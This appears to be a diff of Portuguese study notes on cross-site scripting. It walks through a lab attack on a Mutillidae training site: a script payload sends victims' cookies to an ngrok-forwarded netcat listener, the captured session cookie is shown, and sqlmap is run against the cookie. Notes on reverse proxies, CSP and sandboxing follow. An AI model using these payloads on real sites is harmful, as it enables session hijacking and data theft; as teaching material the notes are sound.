@@ -1,114 +1,122 @@
-
-  							Conceitos básicos:
-
-		https 443 
-		http 80 
-					  
-						      Cliente <----- Servidor 
-	   				HTML é "renderizado" pelo navegador quando chega no cliente    
-               					    navegador <------- servidor 
-	         				No navegador: 
-				Controla requisições(request)
-				Controla as respostas(response)  
-
-
-
---- > Por que existem tantas vulnerabilidades de injeção? 
-	-Quando falamos de aplicações web falamos do server side e o client side e existe tecnicas de exploração de falhas em ambos. 
-injeção de código XSS: 
-
-	----- > ( Cross-site Scripting XSS ) 
+	--------------------------------------------   Cross-site Scripting XSS  
 	
-	--> Utiliza o JS do navegador e permite que o atacante ( executor ) envie dados não confiáveis para o servidor.
-        --> isso acontece por falta de validação de dados na entrada, o navegador acaba permitindo a execussão do código malicioso. <--
+	Por que existem tantas vulnerabilidades de injeção? 
+		Quando falamos de aplicações web falamos do server side e o client side e existe tecnicas de exploração de falhas em ambos. 
+
+
+	Por que acontece XSS? 
+         	Acontece por falta de validação de dados na entrada, o navegador acaba permitindo a execussão do código malicioso.
   
-	-- > parâmetros de uma URL são alterados para um código malicioso e encaminha para a vítima. O navegador no computador da vítima interpreterá os 	códigos injetados nos posts: 
-	ex:
-	<script>alert("teste")</script>
-	<script>alert("Cookies which do not have the HTTPOnly attribute set: " + document.cookie);</script>
+	2 TIPOS DE XSS: 
+	
+	1 REFLECTED: 
+	2 PERSISTENT:
 
 sites que podem ser usados para fazer o bypass do XSS: 
 	-- > https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 	-- > https://products.aspose.app/html/pt/url-encoding
 	-- > https://meyerweb.com/eric/tools/dencoder/
 
-3 tipos de XSS:
-   --- >> 1) Persistente.
-   --- >> Vai acontecer no formulário ( onde acontece a comunicação da API com o cliente-servidor ) a inserção de código malicioso que fará uma requisição ao banco de dados ( servidor ) que trará resultado ( persiste ). Ou seja o código malicioso foi injetado no servidor.
+   - >  PERSISTENT
+    Acontece em formulários ( onde acontece a comunicação da API com o cliente-servidor ) a inserção do código malicioso fará uma requisição ao banco de dados ( servidor ) que trará resultado ( persiste ). Ou seja o código malicioso injetado no servidor.
 
-Consequências:
-	--- >> a consequência mais crítica do xss é o roubo de cookies para logar na sessão de login do usuário.
+   - > Consequências:
+	- a consequência mais crítica do XSS é o roubo de cookies para logar na sessão de login do usuário.
 
 Na prática: 
-	exemplo 1: 
-	usando ngrok + netcat 			
+	Site usado para o ataque: http://mutillidae.bancocn.com/index.php?page=view-someones-blog.php
+	
+	Verificando se no formulário existe vulnerabilidade XSS:
+	<script>alert("sasuke")</script>
+
+	Roubando cookies usando Ngrok e Netcat 
+	
+	- > Ngrok 		
+	
 	./ngrok htpp 80  
-	nc -lvp 80 
+	 Forwarding: https://3082-143-202-46-22.sa.ngrok.io -> http://localhost:80
+	 IP externo - > https://3082-143-202-46-22.sa.ngrok.io
 	
+	- > Netcat 	
+		nc -lvp 80 
 	injeção do script no post(formulário) 
-		<script> new Image().src="ip(ngrok)/?cookie="+document.cookie</script>
-		
-	Bypass do script injetado: 
-		- > Podemos utilizar a função atob do javascript para poder encrypt a injeção do nosso código 
-	btoa (<script> new Image().src="ip(ngrok)/?cookie="+document.cookie</script>) encryp
-	atob () decryp
+		<script> new Image().src="https://3082-143-202-46-22.sa.ngrok.io/?cookie="+document.cookie</script>
 	
-	ápos interceptar o cookie podemos utilizar o burpsuit para manipulação de cookie. 
-	Dica: Podemos verificar a injeção sqlinjection nos cookies usando sqlmap ou manualmente. 
-		exemplo:
-		cookie=PHPSESSID=0ot6tnhbrjolnoqkjmh75kra85;%20googtrusername=admin;%20uid=1 HTTP/1.1
-		id='
+	
+	Netcat -lvp 80 
+	Connection received on localhost 45500
+	GET /?cookie=PHPSESSID=0ot6tnhbrjolnoqkjmh75kra85;%20googtrans=/en/pt;%20showhints=0;%20username=admin;%20uid=1 HTTP/1.1
+	Host: 3082-143-202-46-22.sa.ngrok.io
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36
+	X-Forwarded-For: 143.202.46.22
+	X-Forwarded-Proto: https
 
---- >> Técnicas de defesa: << ---
-	1) Analisar todas as requisições feitas pelos computadores. Seria feita uma interceptação da requisição antes de ir para internet. ( proxy )  
+	
+	Cookie interceptado:
+		cookie=PHPSESSID=0ot6tnhbrjolnoqkjmh75kra85;%20googtrans=/en/pt;%20showhints=0;%20username=admin;%20uid=1 HTTP/1.1
+	
+	
+	Dica: Podemos verificar a injeção sqlinjection nos cookies usando sqlmap ou usar o burpsuit. 
+	
+	identificando vuln nos cookies: 
+	
+	PHPSESSID=0ot6tnhbrjolnoqkjmh75kra85;%20googtrans=/en/pt;%20showhints=0;%20username=admin;%20uid=1
+	PHPSESSID=0ot6tnhbrjolnoqkjmh75kra85;%20googtrans=/en/pt;%20showhints=0;%20username=admin;%20uid=1'
+	
+	
+	http://mutillidae.bancocn.com/index.php?page=login.php
+	
+	nano header.txt
+	POST /index.php?page=login.php HTTP/1.1
+	Host: mutillidae.bancocn.com
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
+	Cookie:	PHPSESSID=0ot6tnhbrjolnoqkjmh75kra85;%20googtrans=/en/pt;%20showhints=0;%20username=admin;%20uid=1 HTTP/1.1
+	username=admin&password=admin&login-php-submit-button=Login
+	
+	sqlmap -r header.txt -p Cookie --dbs --dbms=mysql --skip-waf --flush-session --no-cast -v
 
-	 --> Proxy reverso. 
-	cliente -------------- >> proxy reverso ------------- >> internet -------------------- >> servidor  
-		-- > as requisições do cliente seram interceptadas pelo proxy que irá aplicar um conjunto de técnicas e depois passadas a internet.
+	return 
+	[*] information_schema
+	[*] mutillidae
+	[*] mysql
+	[*] performance_schema
+	[*] sys
+
+
+COMO SE PROTEGER DO XSS ? 
+
+- > Proxy reverso
+
+	- Analisar todas as requisições feitas pelos dispositivos. Seria feita uma interceptação da requisição antes de serem enviadas. 
+
+	 
+	        	cliente -------------- > proxy ------------- > internet -------------------- > servidor  
+
+
+	- As requisições do cliente serão interceptadas pelo proxy que irá aplicar um conjunto de técnicas e depois passá-las a internet.
 			 
-	
-	-- > Você permite que um serviço terceiro ( proxy ) controle seu trafego. Quem fará o request é o proxy. Quem recebe o response é o proxy.
-	-> o Servidor pode filtrar ou não essa requisição feita pelo proxy
-	uma vez que é um serviço terceiro.
-
-	3 ) -- Dynamic Data Tainting 
-	
-	cliente --------------- >> internet ---------------- >> servidor
-	cliente << --------------- internet << ---------------- servidor 
-	--- > Durante a renderização da página no navegador do cliente, acontecerá o monitoramento de código JavaScript, e 
-	possibilitanto uma resposta de execução ou não da página. 
 
 
-Proxy: 
-
-	CLIENTE     --------------------> PROXY --------------------- > SERVIDOR 
-	NAVEGADOR                        TRÁFEGO               
-
-	exemplos de proxy: burpsuit é um proxy. Você faz a requisição e a requisição passa pelo burp que também altera a resposta do servidor para o cliente. 
-
---> contramedida do navegador para injeção de código XSS:
-		-- > Content Security Policy (CSP) diz respeito quais parametros são permitidos ou não para serem processados em uma requisição. O desenvolvedor do site pode restrinjir os parâmetros que serão utilizados em uma determinada pagina na sua URL. 
-
---> Sandbox é uma politica de segurança. Testa, Execura e bloqueia. 
-	Sandbox surge como uma necessidade de substituir os antivírus. Os desenvolvedores perceberam com o tempo que a tecnica utilizada de assinaturas ( um determinado software possuirá cógidos maliciosos e irá comparar esse código com outro software ) não estava sendo mais eficaz. 
-
-	
-------------------------------------------------------	
-	-> Qual problema que o sandbox resolve?
-	
-							Entendendo dia zero:	
-	* um cliente possui um antivírus com "n" assinaturas. Entretanto, ele é infectado por uma vírus que o antimalware não possuia em sua assinatura. Logo, ele é infectado. O antivírus instalado no computador da vítima, enviará para uma nuvem inteligente séries de logs sobre o novo vírus onde profissionais irá analisar o ocorrido. Desta forma, uma atualização acontecerá no antivírus para proteger os computadores da nova ameaça.
- 	- >O cliente infectado a primeiro momento com este vírus não consegue fugir das consequências provocadas pelo malware antes da atualização do software protetor. Logo, este cliente é o dia zero. < -
-	
-						Como resolver o problema deste cliente? 
-							   resposta: Sandbox.
-						
-Retomando no caso supracitado do cliente dia zero. 
-	- O cliente antes de receber qualquer arquivo da internet, subirá este arquivo em uma maquina virtual ( nuvem ) e observará o comportamento no sistema operacional linux ou windows. Será observado os processos, registros e toda árvore de execução do programa.     
+- > Content Security Policy (CSP) 
  
--------------------------------------------------------
+- Diz respeito a quais parametros são permitidos ou não a serem processados em uma requisição. O desenvolvedor do site pode restrinjir os parâmetros que serão utilizados em uma possivel injeção. 
 
-xss.txt -> Capítulo Especial de Carlos Marcelo, página 487. livro: Exploração em redes tcp/ip de Sandro Melo.
+	
+- > Dynamic Data Tainting 
+	
+		cliente --------------- > internet ---------------- > servidor
+		cliente < --------------- internet < ---------------- servidor 
+	
+	- > Durante a renderização da página no navegador do cliente, acontecerá o monitoramento de código JavaScript,
+	possibilitanto uma resposta de execução ou não da página em caso de atividade suspeita. 
 
-bypass XSS: 
-- > https://github.com/payloadbox/xss-payload-list
+
+
+
+
+
+
+
+
+
+
